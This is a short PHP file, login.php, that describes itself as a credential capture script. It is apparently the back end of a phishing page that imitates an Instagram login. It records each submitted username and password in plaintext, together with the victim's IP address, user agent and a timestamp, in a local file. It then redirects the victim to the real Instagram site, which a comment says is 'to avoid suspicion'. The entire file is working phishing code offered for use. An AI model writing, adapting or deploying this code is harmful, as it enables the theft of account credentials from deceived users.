<?php
// login.php - Credential capture script
header('Content-Type: text/html; charset=utf-8');

// Define the file to store captured credentials
$captureFile = 'captured.txt';

// Check if form was submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the submitted credentials
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    // Get additional information
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');
    
    // Prepare the data to be logged
    $logData = "Timestamp: $timestamp\n";
    $logData .= "IP Address: $ipAddress\n";
    $logData .= "User Agent: $userAgent\n";
    $logData .= "Username: $username\n";
    $logData .= "Password: $password\n";
    $logData .= "----------------------------------------\n\n";
    
    // Save to file (append mode)
    file_put_contents($captureFile, $logData, FILE_APPEND);
    
    // Redirect to a legitimate page (to avoid suspicion)
    header('Location: https://www.instagram.com');
    exit();
}

// If not a POST request, show the login form
?>